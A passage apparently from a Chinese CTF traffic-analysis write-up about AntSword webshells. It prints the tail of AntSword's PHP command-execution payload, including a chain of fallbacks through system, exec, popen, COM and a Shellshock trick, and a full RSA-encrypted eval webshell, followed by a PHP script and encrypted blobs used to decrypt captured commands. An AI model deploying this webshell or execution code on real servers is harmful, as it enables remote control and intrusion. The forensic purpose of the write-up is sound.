    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
    if (substr($d, 0, 1) == "/") {
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    } else {
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    if (!empty($envstr)) {
        $envarr = explode("|||asline|||", $envstr);
        foreach ($envarr as $v) {
            if (!empty($v)) {
                @putenv(str_replace("|||askey|||", "=", $v));
            }
        }
    }
    $r = "{$p} {$c}";
    function fe($f)
    {
        $d = explode(",", @ini_get("disable_functions"));
        if (empty($d)) {
            $d = array();
        } else {
            $d = array_map('trim', array_map('strtolower', $d));
        }
        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
    };
    function runshellshock($d, $c)
    {
        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
            if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                $tmp = tempnam(sys_get_temp_dir(), 'as');
                putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                if (fe('error_log')) {
                    error_log("a", 1);
                } else {
                    mail("a@127.0.0.1", "", "", "-bv");
                }
            } else {
                return False;
            }
            $output = @file_get_contents($tmp);
            @unlink($tmp);
            if ($output != "") {
                print($output);
                return True;
            }
        }
        return False;
    };
    function runcmd($c)
    {
        $ret = 0;
        $d = dirname($_SERVER["SCRIPT_FILENAME"]);
        if (fe('system')) {
            @system($c, $ret);
        } elseif (fe('passthru')) {
            @passthru($c, $ret);
        } elseif (fe('shell_exec')) {
            print(@shell_exec($c));
        } elseif (fe('exec')) {
            @exec($c, $o, $ret);
            print(join("
", $o));
        } elseif (fe('popen')) {
            $fp = @popen($c, 'r');
            while (!@feof($fp)) {
                print(@fgets($fp, 2048));
            }
            @pclose($fp);
        } elseif (fe('proc_open')) {
            $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
            while (!@feof($io[1])) {
                print(@fgets($io[1], 2048));
            }
            while (!@feof($io[2])) {
                print(@fgets($io[2], 2048));
            }
            @fclose($io[1]);
            @fclose($io[2]);
            @proc_close($p);
        } elseif (fe('antsystem')) {
            @antsystem($c);
        } elseif (runshellshock($d, $c)) {
            return $ret;
        } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
            $w = new COM('WScript.shell');
            $e = $w->exec($c);
            $so = $e->StdOut();
            $ret .= $so->ReadAll();
            $se = $e->StdErr();
            $ret .= $se->ReadAll();
            print($ret);
        } else {
            $ret = 127;
        }
        return $ret;
    };
    $ret = @runcmd($r . " 2>&1");
    print ($ret != 0) ? "ret={$ret}" : "";;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();
?>
```

#### RSA

```php
<?php
$cmd = @$_POST['ant'];
$pk = <<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx
PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ
5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J
RAcfJSQCvaw6O8uq3wIDAQAB
-----END PUBLIC KEY-----
EOF;
$cmds = explode("|", $cmd);
$pk = openssl_pkey_get_public($pk);
$cmd = '';
foreach ($cmds as $value) {
  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
    $cmd .= $de;
  }
}
foreach($_POST as $k => $v){
    if (openssl_public_decrypt(base64_decode($v), $de, $pk)) {
       $_POST[$k]=$de;
  }
}
eval($cmd);
```

可以直接用CTF-NetA一把梭

![](imgs/image-20250515121850746.png)

![](imgs/image-20250515121856215.png)

当然，我们也可以自己写个 PHP 脚本导入公钥解密

```php
<?php

// 常规蚁剑的马
$cmd = "GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=";

$pk = <<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh
TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j
OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A
LzrcBi88Eu7oZaPANwIDAQAB
-----END PUBLIC KEY-----
EOF;

$cmds = explode("|", $cmd);
$pk = openssl_pkey_get_public($pk);
$cmd = '';
foreach ($cmds as $value) {
    if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
        $cmd .= $de;
    }
}
echo $cmd;


//$_POST["l6eca85c56d82c"] = ['Zn4Zj/XIusIg6hgVKeAyHg5YkY0aHpA+sClHd8bYyJwJQWeTKg9O0rWjx4uyNAp3lDxcubak981Mj4z7pGLLMcARQVssILHX6HGKnJoWkB6cNCbfbwI8YqUC1NgEsj5iQtfdIDRCmaczzw6/m+tlohMFoQSrN8SASUQ5FrURdq8=', 'ScFasYUe1rnzXnGAXtEEQ1HY5nhBfdQ2DCBkSMc0/UvE1Pw6Gyhlbe9B8m9Sq7H1QXMeFEQw7C/MHVIUFfKwFCEaIeScKV0uwDZAQ6aPPaVlx00zWnp1RLvv4fvh9qMt32NEVK6pH4l+tTSUtGTbjKNM3AHJIPigWgJdxiyIn+8=', 'OGIDiLqt55rKrqDCWBal9irWhxdFoTcR/yBdMpuHY6KwQqg40zQb6wLJ7KvMZSWJfI4EcMIchta0oLIaxUy0Mtn6MvUVIo1Kg2OoFyAS2DPlt/2vwN8lSMDmfWSdyv+oAGyE2H068KoB8kX35Wn+LEF2IEMDaOzx2azojkXycXU=', 'AQMG1moPhYMGh04jYOhrxI389fD7Er+8lkP+xa4yLZyQk6Zp2DgI/2Mzt9sDRvVRrDm80dzx16o2zNkRiKRAJrK1RQuMl4wuFph5meAoCt+aDe6ct4iX3DHkEveAVikjvIhYg4hQMMwYFZ7t+uP5wtdLs8f2mBCaDqhOCq7OIlY=', 'Mriexd4PpivbbGf3p4ALnXtkLufDDcDjQL/y/XLJcwTEsebSlUrSvCR59KZOD+PqVxYY5gxfYPGzoIqCrIsEsMye7OxIAFFn2489rfHzRai3xKJKG5Bj19HnMgX1BPyrypDbKkleEDlkYCYHgE9nH/4CFPXQr362Kxp5TeiMhd4=', 'Js7EXmASNJv7vhWlQOjg2c1fypN/R+U/o8xXOY8/SVCmUuz7QRqcc52Qxof3SFD2XxzSRTqnHZdIE27tp5jV2UGHi5Z2jc+gj8UmqTE8VuP6X6FOhUqGC96prfxmbSCMkA/e8mtJsJXiGhjHkRvULnBoTzRlf7/PQaGmnmoKEzs=', 'D3AolWpp3tEoJI+zfdYBfonRED1vlE5qh6sJug+wCk9r7PQex1dsFHzMb57+ogMFaXk3Gz7fBnr06PWca6xYzdPHHdVCNO2p1P60sFRS7mvLRs+CBotiEGd9U4ChDQ5yLPO96sSWOo5iVU3rZPeOdNUZW3yyaNZ8r/IynfPMsZQ=', 'mTW7v54Iy44qnOyJeXu/oCFVaKOBj06eLi5zxPpe073AO1jn5nwMBR0UK7Xa/bG5NlBfplS3Y3Ll1ya2mvOe+4LIRKgMOXRGejdMb2S93IbCXPqp7XVNrqcrXr95SkJeeEk+zktgD16/WpixUCgs0GFYmGAKSeGaYmdaQ+sDKmk=', 'SUwTv5sLFChoUtykcBW1sqi/4Len4YEYM+3VpNR1xbfHHSThR2jjK0TeXPBk9vLVzuWPIpg7ZRAQgoi+OoOeDjoEzmYMw0nuaZvjw6GKZrH+UQlFBZuVZ248ZdvqH1zQCX3tTWM7NxGnPKNqD7JEjS+ixsCGk5Ea7gb88yI1Fz0=', 'FNwwTLPWXutIJwqnDwgluIv/Ies/71C8H+UUuG9KuULzXiZYNlbOSfAZu0hT+YD6B2cVN3nA4l5B3zDYU13UiQh9LewNC8KUnBlOPqhZPC57iiXJBETg+FDo9UZswN7JkM6FaZp1osmCtBtP+uPbs9op/nACWTqRDlc3AzmzhC0=', 'g/cOJmEmrg1046z5unyLSfag901Dwbiog/06TTgBzbZCxBYzqNMiLpj3q9WzzrzfZpv8Y1sPSwAhbW+6ux7+bH6d+QbgfJK5I5Fxsd/9yweOa04JhWieCRizU8uMm3oWt2ZrvdThgyO0gymm7UTIqeMz8jEnUDh3E7rGI3PcLyI=', 'DCAfid4xuUbZvB52YRqDOJ1eZ9oxZOWjUgT5MgDZ8ATlt1kfGrRF8xfu99takkdl0pS52cxzUylyotJFDD2XZ+yDJIM3T9eojj0/o1J1umNxa8oW/rGtzp+dMnGiofpjaaHxxfjwDztbglYPvC4MtsxMxm5EIVqvuWAXDbniCt8=', 'PtgveYLNMoPTJbdMLIMUfcKG5xHEuH+0woXkCO8vF25EEH9Kt/TT2M6sIEYvhKJX+geysxkOFMjDEucKQeEPV3E2Xtkzu57QR4yLDnzq07qmYYqBsAXZD9Thon16axBvQdwJ2R21BKEIvfucBKE7lR4DL5idxXCQMZseRh/dFNE=', 'R4Te1rFFngYZVODMcwZ8foyk+U0A2Rs6AhwXKI4duiECWGcZhbDKyHkOstfggZceBlMdLDO7zw1C5HqMFWkvDOqawLZL8kl+XGnGoRKZaqZut27l3fB20eW+X/2jk3tgS5XDMkmiTjWfJ0Fns+bpoDZULXO3USMSnrsPy/zeosM=', 'QhGblZx2qZpBWU1WNGSb4In1lIEydg4qOKTIDgdSx3jS4YOfV58sgOHcaOzoZK9vEqsKbqjJl+MGShmilwuwZFkolnb73hKAR74RXodHEUonGJcZMpWxanvhe8AqjBUmt2AtIQ/l9fu39l79djKnbw2v5OoBMMSHRomf9iCIgJg=', 'RsBFWXfFGbe6QNPs+Bjb2vgWKS1cQ1hCQdnjbfMWXRIlln/z9LNz8TWw1OTY0le8pSKil15yyWVHWu8Z6AgwgGcw/fhHy2JN4m/LsnAtWUR4ae/CLeZxCGs2PMJTI72qAUkhQY22g/4P8pKZN9UuzS9J7o1AmTuBGIULYNOpOrA='];

//$_POST["u51aea36fa19a7"] = ['QsXJKJ+HbslLx5m2I3NOeM4bW62m7LWOrDehaEf6XfBjIvU03I5qrX3DPPiIXlovgL85iuAf5Z8vauDIY+tCrNQxaefDg0UuhEVubSB/smQWDfFgbRfKRyF93GFCT2jEkhTO0rH0ohzTCYmMcQh+2Sndhf717fUCzbyI8xmHk2eHZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==', 'lkg5ELvolihY/qU7jRsjXoFqK2eh/6Q/bM/s0L7cAZ9Nz7/99SKe7ez1uCQIaWdEtYrPYaWM0F5JqX/g9S0d8AZlUgg2LmwDJHwR8NLA5LMwohwsaYuIVJ/ojS0c8K1b+qbnrIPO5bzy3VnVaM4kHdmDrEF5FvSbzEx2PmxJSuI=', 'njtBworWRl9RQtpVKnNbefSnJdWWSmTPMnSSVBHSCgRTglKsCKF+jeqlhLy1O7Yda/H5hMF6OGMjn+x+bAHVYViWOwPBWRdNZbp8KteJvPfx+8K+X3BpmjmpsrgvS8f9PipgoCaQ5uGCt2MFTHidQ/Dl22Fv+EY54IZpkzv6qMqHZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==', 'LhpEKqCGqIVO3UeoJMKOAld0Je185OIx3yxB277muqA2UIURtPGeskBh7ks2O4Yka1XK3kI/DBs8tNAbRXmDgDov7VhtdH1blRdd5qEnmzzyOQNGEnuDkTPxvmwTWmHGcX4HV4jJ5YkF/6l7t9N6WmV7jjVcnw8iJFhfPlrPEmQ=', 'bAV20O86Mjx9jAR+1oTaFUokJgb8WwgG0kcuFomp3Z3oB2PhzdBmPnqgAsczLbw0MgjlomXcswh1ppWX+UTZu1HEriKJ485h7uUSwralQ7AIpuHz0Te7EBk93rB6K9e5z2cVtr9AFS39iGBnGZz6POEfeUPBxr+KPmffIty3+pQ=', 'OBlv9+3FmnsXIHz0e0SO5FSUyb5Vzk/lsszyuqgxI3LnyNyQJBLeUYJ6Z/Y+mgPkPVTS3XXbl7dw9r96ise1P0oxQ1OpF3CduihESGhv8hsjsGtyodDVoOXX/IqafSG6A5+RrrSE2QXSu1jR82eaKqz8tirqeDGjxvxQcP8hCHY=', 'NP80SyrmGiIns4eM5g+ZxmKrDZeLZ+Po50XYvL6jfnaKUmguyL4zyhmMP2pUc/lJKjAzNBwAuu8nzr59weMtfwWCnxxW+odCniTloqtgjNz4XMfmFMQt9JyXimR7MmAZLslAAVQ3BqZi+o5yAZolhhdWZFZID4eFeWUt90mH6foo3Kwv7cpKoucidOB4WmC+cgQr8J4wV+90ucZMShIACSDWIwzQkWf5ipKYX3TDPpxdx6mB/myr+qSKvJ6cIMj2+C2JcNeMugLFwPcz8FdYAeTNfS99HR2/s2wORcWPvjLgo81GJmY9hEynw0TiN6FsUfTTSXZZQrgawL3hVJihIQ==', 'liznpAZwDr08AvagvCka74dg8JEmt11DJA0gqntiVYfGiJXTXDDcwoEFAQjEtilhu/HriqBhs+9MnHHehKNC7dqycC9Zee9QD1Dc3bVHNw+qE8Xo47591rD2V4HieLMyVLPkS226cr2EEjcohq49czicdNuxS1174fJFVT5KaKYqzY8ePpqnDtVgQpOw2COA7Oynj8TMoDBjRdqj15Bi84zw2ccg6Co0MdfCSBKpNx2aXAU9W/3HTQK2o8NbYx0mX1iVQ2rKnUXfGcIzDDI+lQFIelJ5IGBpiCZWhx2otRYOR89UkpGXQ34Om34s4iLtw/X8AMXkO+opsVEzOPJchQ==', 'kYmwYioUXSEJdbQGaZNF2F8hELzyhWJt7pTcT0xrMd6wLmD/nKvZTUztFzbvH4ESRmmC+QsncW+vw4hTflc0DkO9g9PCiCp7GjS8aEpIT/9IivgMatu1gQmkQSLiJHSc1Krhgd03LWbHax23GjcXn1Wl8I5DKXeLAst4bx7WWr6HZQGs5ICJTAMDGkfS9czxKPO10FO0iDxzJYBWDGan/oMftyDmbC2Y7NSeHJ0G6Lj+RnUg5+NlxQCm3HT8WXs87rNvzb5d+H2YHEP594swVsQKstPKiXSPiPQiIfZRXhpXypNnYxd8YmkLngfDMVhttCWT+NgnVGkHQZ6/sB13TQ==', 'm4CmQPu0sxKIydnnGtkWSfc34mLRJj+Rh7+8nWU2ZF8T2E1u2yBt/JDaSjM+Upa52PjbxQYZ0/V+SnRv3qmARNOpH5Snqjm60YYlMbNH7ajDeojHAMVe7YqQ3gdFThdqEQq1qKBxPfVDPodlbvRDKvy272MxDEPl6hntE+cQedU=', 'SpdmQo8YK6Iag/3iNakttTCsmjdZN+VU9AakLngsk00A9jL6e5zyjPF5ePQpXrXxy2ZjSXLfS5J9t7xatfP6Rqjsl/7UQU+jrfgLE9fejXv0mOSDjZuu+4Qaw8eLX0QIbohjkI6eyTHcKBDITcEt2oe6vBG4re29lCopCaXOo+RXtS3zvuPe3777naWT4eyOkZV2dNROvyUlPdUky5ElfEo9qkqr9nQ9UJqOPfRQFw0HV+WkoY6lWCewG8O1kb08iULwTsaiLwq0WFq5gnF0GR1GjhbTDuqPxA0ad97Rkf2U/GVkGlyozThVYOlmsOiWbl73Lq1AUX2MDvN8JIMBDIPAxtO0It5WqDzr1Lmbn6IwxsUtkm9OVkibNNWDnsYu/ZooBtPaeWiR6orGpORfHgWGAJtZJbxFpgecvlwpyET04/co0wwJsleK9h6DQNI786xi9GKHhzkOs9JzeBwO6bPjgGQhhAY+YqOr+A68x7YINw2UOr7f3VaiWP5hWZQlG0X5yVhMVPiYvvcvYBF7/ZafdeifZYG2vYJmtD2kZ9wlTnwFXujUeqMGVHtIIE4RBpAN1nTVxaPlCpDLR7cZBCcWbeEbVgoUco2dFUuq6JUP/lVCRQu/O6A5hlrqYbNP/ZHErvn8V4/oymBeF7BngUkDnPcKL7ueoRVBC2WoYgyVVCy5A4de/gQwBR6qTJi7mCPHr/bA6JWeJDt3iG4y6AY4QcW9/vBrdC39uLgxo2reVljQZ/riC3la70g5DnGTHd/mdo5VYN6PhwHLtya7H1fAlS37/+ybggDyECtO9/RogvrLuI4QWdEFh3aZkavAiYXFdqOfB4tdxgRZCyninwmtSq0Zuylv8O3K0ZZCm1r8fpUhOM/5u5ti8xew2d+RM57rdaXvNSyoqg404M6adNfG6+cyaoHJBGzr4ET6fdO7dkgUt8rsdgW6JztH6epw4XxZ+fiw+jGL5RxXg0xHD9WLNnh02cwWo2FSTPLgowwFvfwGDHjMH/HtgJKROjknhNRrDAW+Uz/RXWkZJoIj1ypbSIhWjVCBsHwc5McpUnfK/iL8wudMkIztSBS9Z9n2SRAIOwgalrnOMuVeS5dNd8WmHzDOC3pQ2rZ/vjy18UIYJkVzxrPw79GHmjSlUWouSs3tQwlQ5WhkK2lGl8vTBLDNJA7R2/O5b2MEz7BDnNA=', 'ZiKfh/mdWXeAMBngvBKOGSXMnHdMjBt774kcjbn1cXl6l32kZi6Bv3949cEjAy4PQwQJWlTxmMT+JD0aZ4mkZN9S5lhNZIg1T29KxU/oryNonP0aVoTsYvqgiqjoaPZ6tRzjnNSujojyelHISea7W9ZgFdqHOn3X4/SMNYjo0u0=', 